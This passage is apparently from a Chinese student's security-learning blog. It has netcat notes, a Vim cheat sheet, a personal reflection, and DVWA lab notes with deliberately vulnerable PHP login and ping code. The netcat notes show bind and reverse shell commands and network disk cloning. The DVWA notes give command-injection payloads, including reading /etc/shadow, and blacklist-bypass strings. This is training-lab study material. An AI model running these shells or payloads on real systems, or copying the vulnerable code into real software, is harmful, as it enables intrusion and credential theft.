alt=""><br>然后两台电脑实现聊天的功能！</p><h3 id="远程电子取证"><a href="#远程电子取证" class="headerlink" title="远程电子取证"></a>远程电子取证</h3><p>kali 32Bit</p><p>root@kali:~# nnc -l -p 333       //打开端口333</p><p>kali 64Bit</p><p>root:~# ls -l | nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>root:~# ps aux              //查看可疑的进程</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333 &gt; ps.txt   监听333端口有信息重定向到ps.txt文件里</p><p>kali 64Bit<br>root:~# ps aux | nc -nv 10.1.1.12 333 -q 1<br>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>kali 32Bit<br>root@kali:~# cat ps.txt         //查看ps.txt文件<br>kali 32Bit<br>root@kali:~# nc -l -p 333 &gt; lsof.txt</p><p>kali 64Bit</p><p>root:~# lsof | nc -nv 10.1.1.12 333 -q 1</p><p>(UNKNOWN) [10.1.1.12] 333 (?)  open</p><p>kali 32Bit</p><p>root@kali:~# more lsof.txt    //这个文件比较多，所以用more查看文件</p><h3 id="NC—-传输文件-目录"><a href="#NC—-传输文件-目录" class="headerlink" title="NC—-传输文件/目录"></a>NC—-传输文件/目录</h3><p>传输文件</p><pre><code>A: nc -lp 333 &gt; 1.mp4 侦听此端口 接受文件B: nc -nv 1.1.1.1. 333 &lt; 1.mp4 - q 1 发送到A的计算机 只连接一秒或A: nc -q -lp 333 &lt; a.mp4 把视频文件放到333侦听端口 发送B: nc -nv 1.1.1.1 333 &gt; 2.mp4 客户端链接的得到文件</code></pre><p>传输目录</p><pre><code>A: tar -cvf - music/ | nc -lp 333 - q 1B: nc -nv 1.1.1.1 333 | tar -xvf -</code></pre><p>加密传文件</p><pre><code>A: nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4          文件解密B:  mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1     文件加密</code></pre><p>A:</p><p>root:~/Desktop# nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 </p><p>Enter passphrase: xxxx </p><p>B:</p><p>root:~/Desktop# mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p><p>Enter the passphrase (maximum of 512 characters)</p><p>Please use a combination of upper and lower case letters and numbers.</p><p>Enter passhrase: (UNKNOWN) [10.1.1.12] 333 (?) open</p><p>en</p><p>Enter passphrase: xxxx</p><p>NC不自带mcrypt,需要自己安装！</p><h3 id="NC—–流媒体服务"><a href="#NC—–流媒体服务" class="headerlink" title="NC—–流媒体服务"></a>NC—–流媒体服务</h3><pre><code>A: cat 1.mp4 | nc -lp 333B: nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code></pre><h3 id="NC—–端口扫描"><a href="#NC—–端口扫描" class="headerlink" title="NC—–端口扫描"></a>NC—–端口扫描</h3><p>  nc -nvz 1.1.1.1 -65536</p><p>  nc -vnzu 1.1.1.1 1-1024</p><p>root@1kali:~# nc -h</p><p>[v1.10-38]</p><p>connect to somewhere:   nc [-options] hostname port[s] [ports] … </p><p>listen for inbound: nc -l -p port [-options] [hostname] [port]</p><p>options:</p><pre><code>-c shell commands   as `-e&#39;; use /bin/sh to exec [dangerous!!]-e filename     program to exec after connect [dangerous!!]-b          allow broadcasts-g gateway      source-routing hop point[s], up to 8                          设置路由器跃程通信网关，最高可设置8个。-G num          source-routing pointer: 4, 8, 12, ...                         设置来源路由指向器，其数值为4的倍数。-h          this cruft -i secs         delay interval for lines sent, ports sca                      延时的间隔    -k                      set keepalive option on socket-l          listen mode, for inbound connects                             监听模式,入站连接-n          numeric-only IP addresses, no DNS                             直接使用ip地址,而不用域名服务器-o file         hex dump of traffic                                           指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。-p port         local port number                                             本地端口-r          randomize local and remote ports                              随机本地和远程端口 -q secs         quit after EOF on stdin and delay of secs-s addr         local source address  -T tos          set Type Of Service-t          answer TELNET negotiation   -u          UDP mode                                                      udp  模式-v          verbose [use twice to be more verbose]                        显示过程,vv 更多-w secs         timeout for connects and final net reads                      等待连接超时-z          zero-I/O mode [used for scanning]                             使用输入/输出模式，只在扫描通信端口时使用。</code></pre><h3 id="NC—–远程克隆硬盘"><a href="#NC—–远程克隆硬盘" class="headerlink" title="NC—–远程克隆硬盘"></a>NC—–远程克隆硬盘</h3><pre><code> A: nc -lp 333 | dd of=/dev/sda B: dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></pre><p>远程电子取证，可以讲目标服务器远程复制，或者内存。</p><h3 id="NC—–远程控制"><a href="#NC—–远程控制" class="headerlink" title="NC—–远程控制"></a>NC—–远程控制</h3><p>正向：</p><pre><code>A: nc  -lp 333 -  bashB: nc  1.1.1.1 333</code></pre><p>反向：</p><pre><code>A: nc -nv 1.1.1.1 333B: nc -lp 333 -c bash</code></pre><p>注：Windows用户把bash改成cmd;</p><p>root@kali:~# ifconfig</p><p>eth0      Link encap:Ethernet  HWaddr 00:0c:29:c6:89:56  </p><pre><code>      inet addr:192.168.198.130  Bcast:192.168.198.255  Mask:255.255.255.0      inet6 addr: fe80::20c:29ff:fec6:8956/64 Scope:Link      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1      RX packets:46 errors:0 dropped:0 overruns:0 frame:0      TX packets:49 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:1000       RX bytes:6770 (6.6 KiB)  TX bytes:8161 (7.9 KiB)      Interrupt:19 Base address:0x2000 </code></pre><p>lo        Link encap:Local Loopback  </p><pre><code>      inet addr:127.0.0.1  Mask:255.0.0.0      inet6 addr: ::1/128 Scope:Host      UP LOOPBACK RUNNING  MTU:65536  Metric:1      RX packets:20 errors:0 dropped:0 overruns:0 frame:0      TX packets:20 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:0       RX bytes:1200 (1.1 KiB)  TX bytes:1200 (1.1 KiB)</code></pre><p>A:</p><p>root@kali:~# nc -nv 192.168.1.115 333 -c bash </p><p>(UNKNOWN) [192.168.1.115] 333 (?) open</p><p>ls </p><p>pwd</p><p>没有任何反应</p><p>B:</p><p>root:~# nc -lp 333</p><p>ls</p><p>Desktop</p><p>/root</p><p>ifconfig</p><p>……(一串文字）</p><p>请求来控制我！</p><p>NC—–NCAT</p><p>  Nc缺乏就加密和身份验证的能力</p><p>  Ncat包含于nmap工具包中</p><p>  A: ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</p><p>  B: ncat -nv 1.1.1.1 333 –ssl</p><p>不同系统/平台的nc参数功能不尽相同</p><p>root:~# man nc</p><p>root:~# nc -h</p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NETCAT </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vim简单入门笔记</title>
      <link href="/archis/2e6b5387/"/>
      <url>/archis/2e6b5387/</url>
      
        <content type="html"><![CDATA[<h1 id="Vim简单入门笔记"><a href="#Vim简单入门笔记" class="headerlink" title="Vim简单入门笔记"></a>Vim简单入门笔记</h1><h2 id="三种模式"><a href="#三种模式" class="headerlink" title="三种模式"></a>三种模式</h2><ul><li>一般模式：可以进行复制、粘贴和删除等操作</li><li>编辑模式：按 <code>i</code> 或 <code>a</code> 进入编辑模式，按 <code>Esc</code> 回到一般模式</li><li>命令模式：按 <code>/</code> 或 <code>?</code> 或 <code>:</code> 进入命令模式，按 <code>Esc</code> 回到一般模式</li></ul><h2 id="移动操作"><a href="#移动操作" class="headerlink" title="移动操作"></a>移动操作</h2><ul><li><code>h</code> <code>j</code> <code>k</code> <code>l</code>：用来控制光标移动</li><li><code>gg</code>：返回顶部</li><li><code>G</code>：回到底部</li><li><code>:n</code>：跳到n行（n是数字）</li><li><code>ctrl+f</code> 和 <code>ctrl+b</code>：屏幕向前向后滚动</li><li><code>0和shift+4</code>：回到本行头和尾</li></ul><h2 id="退出编辑器"><a href="#退出编辑器" class="headerlink" title="退出编辑器"></a>退出编辑器</h2><ul><li><code>:w</code> 和 <code>:wq</code>：保存和保存退出</li><li><code>:q</code> 和 <code>:q!</code>：退出和不保存退出</li></ul><p>其中 <code>!</code> 是强制的意思</p><h2 id="复制粘贴"><a href="#复制粘贴" class="headerlink" title="复制粘贴"></a>复制粘贴</h2><h3 id="复制多行"><a href="#复制多行" class="headerlink" title="复制多行"></a>复制多行</h3><p>正常模式下，把光标移到要复制的行</p><ul><li><code>yy</code>，复制当前行</li><li><code>nyy</code>，其中n是要复制的行数，向下复制n行</li></ul><p>按 <code>p</code> 粘贴</p><h3 id="复制部分"><a href="#复制部分" class="headerlink" title="复制部分"></a>复制部分</h3><p>正常模式下，按 <code>v</code> 移动光标选择要复制的部分，接着按 <code>d</code> 剪切或按 <code>y</code> 复制，最后按 <code>p</code> 粘贴</p><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><ul><li><code>dd</code>：删除当前行</li><li><code>ndd</code>：删除当前行开始n行</li><li><code>dG</code>：删除当前行开始至最后一行</li></ul><h2 id="撤销重做"><a href="#撤销重做" class="headerlink" title="撤销重做"></a>撤销重做</h2><p>正常模式下按 <code>u</code> 来撤销，按 <code>ctrl+r</code> 来重做</p><h2 id="注释和取消"><a href="#注释和取消" class="headerlink" title="注释和取消"></a>注释和取消</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ol><li>按 <code>ctrl+v</code> 进入可视化模式</li><li>移动光标选择需要注释的行</li><li>按 <code>I</code> ，然后输入注释符如 <code>#</code></li><li>按 <code>Esc</code> 回到正常模式</li></ol><h3 id="取消"><a href="#取消" class="headerlink" title="取消"></a>取消</h3><ol><li>按 <code>ctrl+v</code> 进入可视化模式</li><li>选择要删除的注释符</li><li>按 <code>d</code> 或 <code>x</code> 删除</li></ol><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p>一般模式下输入 <code>/</code> 然后后面跟要搜索的词<br><code>n</code> 和 <code>N</code>：显示下一个和上一个搜索结果</p><h2 id="显示行号"><a href="#显示行号" class="headerlink" title="显示行号"></a>显示行号</h2><p>命令模式下输入 <code>set number</code> ，然后就能看到行号</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VIM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>17-11反思与进取</title>
      <link href="/archis/fb4597d6/"/>
      <url>/archis/fb4597d6/</url>
      
        <content type="html"><![CDATA[<p>#反思与进取<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711202038_238.png" alt=""><br>很久没这么静下心来去反思，自身的问题越来越多，活的越来越混沌，方向感越来越不是自己的，外界的影响往往大于自身的抉择。</p><p>从5月份开始忙着转专业到现在转入信安专业，我也都没忘记自己高考报名这所学校的初衷，也如愿的进入自己理想的状态， 期间太过于迷茫， 总是怀疑自己到底可不可以，如果放弃每天都可以打打游戏，谈谈恋爱，扯扯不知所云的理想，这多舒服啊，但我也总觉得有人告诉我，“你如果每天都很难受，那么你每天都会成长，当你回过头来发现，你必定会恍然大悟自己的难受是有多么值得。”<br>人总是犯贱和懒惰的， 灌了鸡汤，不过打一个短暂的兴奋剂，过了几天，还是精虫上脑，活如死尸。<br>舒服了太久，不知道自己有多差劲。<br>这半年也眨眼即逝，从开学到现在也忙于进入三叶草小组，也卓有成效，靠着脸皮与努力如愿进入小组，但这几天自己高兴过头不知道自己其实还差太远，万万不可得意忘形。这话也是我的girlfriend在我们吃庆功宴的时候告诉我的警告。<br>每每觉得自己可以接近完工的时候，我心里总会告诉我自己休息一会儿，马上就好了。然后浪费很多时间，而距离真正的完成却差距很多。从而再次理思路，完成这期间花费的时间往往是巨大的。</p><p>大概看了彭哥的博客感触越发深刻，这一年的多的时间里自己真正想要的总会偏移正轨。<br>这一年的懒惰心里尤为可怕，凡事为自己查找借口，凡事为自己解脱多容易啊，不懂装懂多好啊，别人会觉得你多厉害多聪明啊。<br>这些人性的弱点往往在自身的思考之后越发觉得厌恶。</p><p>或许是时候做些改变。<br>或许苦味的生活才是该拥抱的。<br>或许应当用力量固执地强迫自己向前去奋斗，到力尽气竭为止。</p><p>脸上有阳光，脑子里有爱情，灵魂里有进取，这大概是我现在最想要追寻的。</p><p>接下来的生活真的需要不竭的动力去执行<br>我需要做到：<br>1.找回自身的最好的状态，不睡懒觉，不找借口，做最好的自己<br>2.每周连载2篇博客<br>3.学习成绩年级top20，过六级，每两日一份试卷<br>4.认真听取每节课，不浪费一分一秒<br>5.寒假结束之前将安全牛web安全工程师所有内容学完<br>6.下学期进入核心组</p><p>佛曰：精进。</p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DVWA笔记</title>
      <link href="/archis/18acffef/"/>
      <url>/archis/18acffef/</url>
      
        <content type="html"><![CDATA[<h1 id="DVWA笔记"><a href="#DVWA笔记" class="headerlink" title="DVWA笔记"></a>DVWA笔记</h1><h3 id="一：搭建平台"><a href="#一：搭建平台" class="headerlink" title="一：搭建平台"></a>一：搭建平台</h3><p> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710232230_351.png" alt=""></p><p> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710240131_802.png" alt="中文图"></p><hr><h3 id="二-Brute-Force"><a href="#二-Brute-Force" class="headerlink" title="二: Brute Force"></a>二: Brute Force</h3><p>Low:</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Get username $user = $_GET[ &#39;username&#39; ]; // Get password $pass = $_GET[ &#39;password&#39; ]; $pass = md5( $pass ); // Check the database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>参数username、password没有做任何过滤，存在明显的sql注入漏洞。<br>在Login中输入用户名与密码<br>用burpsuite进行拦截<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710232240_813.png" alt=""></p><p>将表单进行提交到intruder模块，在password参数的内容两边加$，并将password设置为破解的payload<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710240053_146.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710240056_540.png" alt=""><br>尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710240109_245.png" alt=""></p><p>Medium：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check the database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击(MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义)；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，源代码中只是添加了sleep函数，依然没有加入有效的防暴机制。</p><p>查看源码发现</p><p>sleep( 2 ); </p><pre><code>1</code></pre><p>测试不成功时会延时2s，方法和low一样，只是慢一些，需要更新cookie中的安全等级security。</p><pre><code>headers = {    &#39;Cookie&#39;: &#39;PHPSESSID=h6r8555q2obvo388r4u50lg397; security=medium&#39;}</code></pre><p>High：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><p>通过checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ );加入token和generateSessionToken();加入Anti-CSRFtoken预防无脑爆破，所以我们不可以再使用burpsuite工具进行无脑爆破了。而且 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。<br>还是可以去进行暴力破解，这个就需要python脚本来完成了。通过浏览器访问，打开F12进行查看，我们会发现每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。同时，我们可以看到user_token在源代码中可以获取到的。所以我们需要写一个爬虫来获取页面中的user_token的值。</p><p>Impossible：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_POST[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_POST[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time   = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  { // User locked out.  Note, using this method would allow for user enumeration! //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = $row[ &#39;last_login&#39; ]; $last_login = strtotime( $last_login ); $timeout= strtotime( &quot;{$last_login} +{$lockout_time} minutes&quot; ); $timenow= strtotime( &quot;now&quot; ); // Check to see if enough time has passed, if it hasn&#39;t locked the account if( $timenow &gt; $timeout ) $account_locked = true; } // Check the database (if username matches the password) $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { // Get users details $avatar   = $row[ &#39;avatar&#39; ]; $failed_login = $row[ &#39;failed_login&#39; ]; $last_login   = $row[ &#39;last_login&#39; ]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) { echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; } // Reset bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Set the last login time $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。菜鸡发抖</p><hr><h3 id="三-Command-Injection"><a href="#三-Command-Injection" class="headerlink" title="三:Command Injection"></a>三:Command Injection</h3><p>命令注入漏洞是特别危险的，因为它们允许未经授权的执行操作系统命令， 它们的存在，因为应用程序无法正确地验证和消毒，使用时调用shell的功能，如的参数。 攻击者与控制这些参数可以欺骗应用程序执行任何系统命令自己的选择。为了正确测试命令注入漏洞，应遵循以下步骤：</p><ol><li>§ 第1步： 了解攻击场景</li><li>§ 第2步： 分析原因及对策</li><li>§ 第3步： 开始试验和探索</li><li><p>§ 第4步： 微调测试案例</p><p>命令注入攻击的常见模式为：仅仅需要输入数据的场合，却伴随着数据同时输入了恶意代码，而装载数据的系统对此并未设计良好的过滤过程，导致恶意代码也一并执行，最终导致信息泄露或者正常数据的破坏。<br>PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p></li></ol><pre><code>&lt;?php   if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {   // Get input   $target = $_REQUEST[ &#39;ip&#39; ];   // Determine OS and execute the ping command.   if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {   // Windows   $cmd = shell_exec( &#39;ping  &#39; . $target );   }   else {   // *nix   $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );   }   // Feedback for the end user   echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;   }   ?&gt;</code></pre><p>$target = $_REQUEST[ ‘ip’ ];直接从文本框中输入的内容，没有任何限制，刚刚我们在上面也看到了，在操作系统中使用“&amp;&amp;”连接符（在windows下一个&amp;和两个&amp;都可以，在linux下一定要两个），可以执行多条命令。</p><p>如果输入的值不是一个简单的IP，而是127.0.0.1&amp;&amp;net user，那么可以看到返回值里就把系统的用户名拿到了，<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710240138_810.png" alt=""></p><p>还可以注意ping <a href="http://www.baidu.com.cn" target="_blank" rel="external">http://www.baidu.com.cn</a> || net user的写法，这句话的意思是如果||的前面命令执行失败则执行||后面的命令。<br>Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件，可见危害之大。</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Set blacklist $substitutions = array( &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39;  =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt;</code></pre><blockquote><p>// Set blacklist </p></blockquote><pre><code>$substitutions = array(     &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,     &#39;;&#39;  =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </code></pre><p>相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。<br>漏洞利用</p><p>127.0.0.1&amp;net user<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710240149_886.png" alt=""></p><blockquote><p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p><p>Command 1&amp;&amp;Command 2</p><p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p><p>Command 1&amp;&amp;Command 2</p><p>Command 1&amp;Command 2</p><p>先执行Command 1，不管是否成功，都会执行Command 2</p></blockquote><p>2、由于使用的是str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：</p><p>127.0.0.1&amp;;&amp;ipconfig</p><p>127.0.0.1&amp;;&amp;ipconfig 绕过 </p><p>这是因为”127.0.0.1&amp;;&amp;ipconfig”中的” ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig” ，会成功执行。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710240151_333.png" alt=""></p><p>High：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $target = trim($_REQUEST[ &#39;ip&#39; ]); // Set blacklist $substitutions = array( &#39;&amp;&#39;  =&gt; &#39;&#39;, &#39;;&#39;  =&gt; &#39;&#39;, &#39;|  &#39; =&gt; &#39;&#39;, &#39;-&#39;  =&gt; &#39;&#39;, &#39;$&#39;  =&gt; &#39;&#39;, &#39;(&#39;  =&gt; &#39;&#39;, &#39;)&#39;  =&gt; &#39;&#39;, &#39;`&#39;  =&gt; &#39;&#39;, &#39;||&#39; =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt;</code></pre><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p><p>127.0.0.1|net user</p><p>127.0.0.1|net user 利用</p><p>Command 1 | Command 2</p><p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p><p>Impossible：</p><p>不存在命令注入漏洞</p><p><a href="http://www.4hou.com/technology/1012.html" target="_blank" rel="external">使用Metasploit对DVWA进行命令注入攻击</a></p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $target = $_REQUEST[ &#39;ip&#39; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( 